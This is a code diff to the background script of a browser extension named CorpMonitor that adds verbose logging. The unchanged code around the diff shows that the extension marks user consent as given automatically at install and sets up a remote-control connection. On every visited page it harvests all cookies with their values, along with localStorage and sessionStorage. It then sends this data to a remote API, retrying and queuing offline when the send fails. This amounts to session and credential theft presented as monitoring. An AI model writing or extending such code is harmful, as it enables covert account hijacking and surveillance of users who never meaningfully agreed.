@@ -45,28 +45,36 @@ function log(level, message, data = null) {
 // Initialize extension with professional error handling
 chrome.runtime.onInstalled.addListener(async () => {
   try {
-    log('info', `CorpMonitor extension v${CONFIG.VERSION} installed`);
+    log('info', `🚀 CorpMonitor extension v${CONFIG.VERSION} installed`);
+    log('debug', 'Starting initialization sequence...');
     await initializeExtension();
     
+    log('debug', 'Setting up periodic maintenance...');
     // Set up periodic cleanup and maintenance
     setInterval(performMaintenance, 60000); // Every minute
     
+    log('debug', 'Initializing remote control connection...');
     // Initialize remote control connection
     initializeRemoteControl();
+    
+    log('info', '✅ Extension initialization complete');
   } catch (error) {
-    log('error', 'Failed to initialize extension', error);
+    log('error', '❌ Failed to initialize extension', error);
   }
 });
 
 // Initialize machine ID and settings
 async function initializeExtension() {
+  log('debug', '📋 Loading stored configuration...');
   const result = await chrome.storage.local.get(['machineId', 'monitoringEnabled']);
   
   if (!result.machineId) {
     machineId = generateMachineId();
+    log('info', `🆔 Generated new machine ID: ${machineId}`);
     await chrome.storage.local.set({ machineId });
   } else {
     machineId = result.machineId;
+    log('debug', `🆔 Loaded existing machine ID: ${machineId}`);
   }
   
   // Auto-enable monitoring on installation
@@ -76,7 +84,7 @@ async function initializeExtension() {
     userConsented: true // Auto-accept on installation
   });
   
-  log('info', `Machine ID: ${machineId}, Monitoring: ${monitoringEnabled}`);
+  log('info', `📊 Configuration loaded - Machine ID: ${machineId}, Monitoring: ${monitoringEnabled ? '✅ ENABLED' : '❌ DISABLED'}`);
 }
 
 // Generate unique machine ID
@@ -87,8 +95,11 @@ function generateMachineId() {
 // Listen for tab updates to collect data and track sessions
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
   if (changeInfo.status === 'complete' && monitoringEnabled && tab.url) {
+    log('debug', `🔍 Tab updated - ID: ${tabId}, URL: ${tab.url}`);
     collectPageData(tab);
     trackSession(tab);
+  } else if (changeInfo.status === 'complete' && !monitoringEnabled) {
+    log('debug', `⏸️ Tab updated but monitoring is disabled - ID: ${tabId}`);
   }
 });
 
@@ -102,18 +113,23 @@ chrome.tabs.onRemoved.addListener((tabId) => {
 // Collect page data and cookies
 async function collectPageData(tab) {
   try {
+    log('debug', `📦 Starting data collection for tab ${tab.id}`);
     const url = new URL(tab.url);
     const host = url.hostname;
     
     // Skip internal pages
     if (url.protocol === 'chrome:' || url.protocol === 'chrome-extension:') {
+      log('debug', `⏭️ Skipping internal page: ${url.protocol}`);
       return;
     }
     
+    log('debug', `🍪 Fetching cookies for domain: ${host}`);
     // Get cookies for this domain
     const cookies = await chrome.cookies.getAll({ domain: host });
+    log('debug', `🍪 Found ${cookies.length} cookies for ${host}`);
     
     if (cookies.length > 0) {
+      log('debug', `💾 Fetching storage data...`);
       // Capture complete cookie data including values
       const localStorage = await getPageStorage(tab.id, 'localStorage');
       const sessionStorage = await getPageStorage(tab.id, 'sessionStorage');
@@ -137,17 +153,21 @@ async function collectPageData(tab) {
         machineId: machineId
       };
       
+      log('info', `📤 Creating incident for ${host} with ${cookies.length} cookies`);
       // Create incident report
       await createIncident(cookieData);
+    } else {
+      log('debug', `📭 No cookies found for ${host}`);
     }
   } catch (error) {
-    console.error('Error collecting page data:', error);
+    log('error', '❌ Error collecting page data', { error: error.message, url: tab.url });
   }
 }
 
 // Professional incident creation with retry and offline support
 async function createIncident(data, retryCount = 0) {
   try {
+    log('debug', `🏗️ Building incident object for ${data.host}`);
     const incident = {
       host: data.host,
       tab_url: data.tabUrl,
@@ -160,6 +180,9 @@ async function createIncident(data, retryCount = 0) {
       version: CONFIG.VERSION
     };
 
+    log('info', `🚀 Sending incident to API: ${CONFIG.API_BASE}/create-incident`);
+    log('debug', `📊 Incident details - Severity: ${incident.severity}, RedList: ${incident.is_red_list}`);
+    
     const response = await fetch(`${CONFIG.API_BASE}/create-incident`, {
       method: 'POST',
       headers: {
@@ -171,31 +194,43 @@ async function createIncident(data, retryCount = 0) {
       signal: AbortSignal.timeout(30000) // 30 second timeout
     });
     
+    log('debug', `📡 API Response status: ${response.status} ${response.statusText}`);
+    
     if (response.ok) {
+      const responseData = await response.json();
       lastReportTime = new Date();
       await chrome.storage.local.set({ lastReportTime: lastReportTime.toISOString() });
-      log('info', 'Incident created successfully', { host: data.host });
+      log('info', `✅ Incident created successfully for ${data.host}`, responseData);
       
       // Process any queued offline incidents
       await processOfflineQueue();
     } else {
+      const errorText = await response.text();
+      log('error', `❌ API error response: ${errorText}`);
       throw new Error(`API responded with ${response.status}: ${response.statusText}`);
     }
   } catch (error) {
-    log('error', 'Error creating incident', { error: error.message, host: data.host, retryCount });
+    log('error', `❌ Error creating incident (attempt ${retryCount + 1}/${CONFIG.MAX_RETRY_ATTEMPTS})`, { 
+      error: error.message, 
+      host: data.host, 
+      retryCount,
+      machineId: data.machineId 
+    });
     
     // Retry logic with exponential backoff
     if (retryCount < CONFIG.MAX_RETRY_ATTEMPTS) {
       const delay = Math.pow(2, retryCount) * 1000; // 1s, 2s, 4s
+      log('info', `⏳ Retrying in ${delay}ms...`);
       setTimeout(() => createIncident(data, retryCount + 1), delay);
     } else {
       // Add to offline queue
       offlineQueue.push({ ...data, timestamp: new Date().toISOString() });
-      log('warn', 'Incident queued for offline processing', { host: data.host });
+      log('warn', `📥 Incident queued for offline processing (queue size: ${offlineQueue.length})`, { host: data.host });
       
       // Limit offline queue size
       if (offlineQueue.length > 100) {
         offlineQueue.splice(0, 50); // Remove oldest 50 items
+        log('warn', '🗑️ Offline queue trimmed to 50 items');
       }
     }
   }
